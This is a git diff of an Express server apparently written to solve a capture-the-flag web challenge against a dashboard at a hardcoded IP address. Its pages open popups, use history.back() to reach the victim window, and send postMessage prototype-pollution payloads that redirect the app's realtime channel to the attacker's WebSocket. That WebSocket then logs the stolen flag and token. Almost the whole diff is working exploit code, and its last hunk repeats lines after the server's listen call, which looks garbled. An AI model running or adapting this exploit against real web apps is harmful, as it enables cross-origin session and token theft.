@@ -7,66 +7,62 @@ expressWs(app);
 const PORT = process.env.PORT || 10000;
 const TARGET = 'http://34.118.127.209:35666/';
 
-// ── 302 redirect to dashboard (key trick: browser follows 302 cross-protocol) ──
-app.get('/go', (req, res) => {
-  res.redirect(302, TARGET);
-});
-
-// ── GET / ── landing page: two parallel approaches ──
+// ── GET / ── Landing: open helper popup, then history.back() to dashboard ──
+// If the bot visited the dashboard BEFORE our URL (common in CTF bots),
+// history.back() returns to the dashboard in the same tab.
+// The helper popup's window.opener then points to the dashboard window.
 app.get('/', (req, res) => {
   const host = req.headers.host || req.hostname;
   const wsUrl = 'wss://' + host + '/ws';
   res.type('html').send(`<!DOCTYPE html>
-<html>
-<head><meta http-equiv="refresh" content="2;url=/go"></head>
-<body>
+<html><body>
 <script>
 function L(m){try{new Image().src='/log?'+encodeURIComponent(m)+'&_='+Date.now();}catch(e){}}
-L('landing');
+L('landing|ua='+navigator.userAgent);
+L('histlen='+history.length);
 
-// ═══ APPROACH A: popup via 302 redirect ═══
-// window.open('/go') → HTTPS same-origin (always works)
-// Server responds 302 → http://dashboard (browser follows cross-protocol)
-// We keep the popup reference and postMessage to it
+// 1. Open helper popup (HTTPS→HTTPS, guaranteed)
+var helper = window.open('/helper');
+L('helper='+(helper?'ok':'null'));
+
+// 2. Also try direct popup to dashboard (HTTP) — might work in some Chrome configs
 var pop = null;
 try {
-  pop = window.open('/go');
+  pop = window.open('${TARGET}', 'dashwin');
   L('pop='+(pop?'ok':'null'));
 } catch(e){ L('pop_err='+e.message); }
 
-// ═══ APPROACH B: helper popup + navigate self via 302 ═══
-// Helper popup stays on HTTPS, we navigate to dashboard via meta-refresh→/go→302
-// Helper's window.opener becomes the dashboard
-var helper = null;
-try {
-  helper = window.open('/helper');
-  L('helper='+(helper?'ok':'null'));
-} catch(e){ L('helper_err='+e.message); }
+// 3. After short delay, check popup status and try history.back()
+setTimeout(function(){
+  // Diagnostic: check if popup loaded the dashboard
+  if(pop){
+    try{L('pop.loc='+pop.location.href);}catch(e){L('pop.loc=CROSS_ORIGIN');}
+    try{L('pop.len='+pop.length);}catch(e){L('pop.len=err');}
+  }
+  // history.back() — if bot visited dashboard before us, this goes back to it
+  // Our page unloads, helper's window.opener becomes the dashboard
+  if(history.length > 1){
+    L('going_back');
+    history.back();
+  } else {
+    L('no_history');
+  }
+}, 800);
 
-// ═══ Attack popup (Approach A) ═══
+// 4. Fallback: if we don't unload (history.back failed), attack the popup
 var PP = JSON.parse('{"__proto__":{"telemetryConsent":true,"channelMode":"ws","realtimeEndpoint":"${wsUrl}"}}');
-
 function attackPop(){
-  if(!pop||pop.closed){L('pop_closed');return;}
-  try{L('pop.len='+pop.length);}catch(e){L('pop.len=err');}
-  try{
-    pop.postMessage({type:'prefs:update',payload:{theme:PP}},'*');
-    L('a_pollute');
-  }catch(e){L('a_pollute_err='+e.message);}
-  setTimeout(function(){
-    try{
-      pop.postMessage({type:'diagnostics:export'},'*');
-      L('a_trigger');
-    }catch(e){L('a_trigger_err='+e.message);}
-  },600);
+  if(!pop||pop.closed)return;
+  try{L('f_pop.len='+pop.length);}catch(e){}
+  pop.postMessage({type:'prefs:update',payload:{theme:PP}},'*');
+  setTimeout(function(){pop.postMessage({type:'diagnostics:export'},'*');},500);
 }
-
-[2000,4000,6000,8000,11000,15000].forEach(function(d){setTimeout(attackPop,d);});
+[3000,6000,9000,13000].forEach(function(d){setTimeout(attackPop,d);});
 </script>
 </body></html>`);
 });
 
-// ── GET /helper ── Approach B: attacks window.opener (which navigated to dashboard via meta-refresh→302) ──
+// ── GET /helper ── Popup that attacks window.opener (= dashboard after history.back) ──
 app.get('/helper', (req, res) => {
   const host = req.headers.host || req.hostname;
   const wsUrl = 'wss://' + host + '/ws';
@@ -80,11 +76,13 @@ var PP = JSON.parse('{"__proto__":{"telemetryConsent":true,"channelMode":"ws","r
 
 function attack(){
   if(!window.opener){L('h_no_opener');return;}
+
+  // Check opener state
   var co=false;
   try{var x=window.opener.location.href;L('h_same='+x);}catch(e){co=true;L('h_cross');}
   try{L('h_len='+window.opener.length);}catch(e){L('h_len=err');}
 
-  // ALWAYS try postMessage regardless of origin (postMessage works cross-origin)
+  // ALWAYS postMessage regardless of origin check
   try{
     window.opener.postMessage({type:'prefs:update',payload:{theme:PP}},'*');
     L('h_pollute');
@@ -95,12 +93,23 @@ function attack(){
       L('h_trigger');
     }catch(e){L('h_trigger_err='+e.message);}
   },600);
+
+  // Also try to find named window 'dashwin' (opened by landing page)
+  try{
+    var dw = window.open('','dashwin');
+    if(dw && dw !== window){
+      L('h_dashwin_found');
+      dw.postMessage({type:'prefs:update',payload:{theme:PP}},'*');
+      setTimeout(function(){dw.postMessage({type:'diagnostics:export'},'*');L('h_dashwin_trigger');},500);
+    }
+  }catch(e){L('h_dashwin_err='+e.message);}
 }
 
 var n=0;
 var iv=setInterval(function(){
   n++;
   attack();
+  L('h_attempt_'+n);
   if(n>=20)clearInterval(iv);
 },1500);
 </script>
@@ -128,6 +137,16 @@ app.ws('/ws', (ws, req) => {
       if (s.flag) console.log('\n  >>> FLAG  =', s.flag);
       if (s.token) console.log('  >>> TOKEN =', s.token);
     } catch(e) {
+      console.log(String(data).slice(0, 2000));
+    }
+    console.log('='.repeat(62) + '\n');
+  });
+  ws.on('close', () => console.log('[ws] closed'));
+});
+
+app.listen(PORT, () => {
+  console.log('Listening on port', PORT);
+});
       console.log(String(data).slice(0, 2000));
     }
     console.log('='.repeat(62) + '\n');
